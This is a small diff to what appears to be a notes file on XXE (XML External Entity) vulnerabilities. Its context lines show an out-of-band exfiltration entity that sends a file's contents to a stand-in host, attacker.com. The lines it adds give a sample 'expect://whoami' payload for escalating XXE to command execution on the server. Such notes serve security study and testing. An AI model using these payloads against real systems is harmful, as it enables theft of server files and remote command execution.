@@ -147,4 +147,11 @@ This is Vulnerability
      <!ENTITY % all "<!ENTITY send SYSTEM "http://attacker.com/collect.php?file=%file;'>">
      %all;
  
+ ## Remote Code Execution 
+ 
+ In Some rare cases XXE can be elevated to executed system commands on the server 
+ 
+ SAMPLE paylod: 
+ 
+     <!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://whoami"> ]>
  
